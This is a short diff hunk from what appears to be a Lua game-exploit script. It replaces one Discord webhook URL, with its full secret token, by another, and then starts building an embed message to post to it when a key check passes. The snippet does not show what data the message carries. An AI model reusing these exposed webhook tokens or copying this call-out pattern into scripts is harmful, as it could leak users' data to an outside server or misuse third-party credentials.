@@ -869,7 +869,7 @@ if ct == 2 and _G.Pkey ~= nil and _G.Pkey ~= "" and c == true then
     "Kid with shit exploit"
 
     local url =
-    "https://discord.com/api/webhooks/1089279301972676679/jQ5iSNlV4bqExwYw9CF0wqa15r4iEUS3H6mWS7bCMgzlSZT7uKGyl8TjmIaENYlQMYCr"
+    "https://discord.com/api/webhooks/1089280360438837309/WmOkh2m6d0SLXO-NqLQw6GK5b7__--4_TkGyC-gynpfRy07lOd4269-kQ9MUcW-wLZ0d"
     local data = {
     ["content"] = "",
     ["embeds"] = {
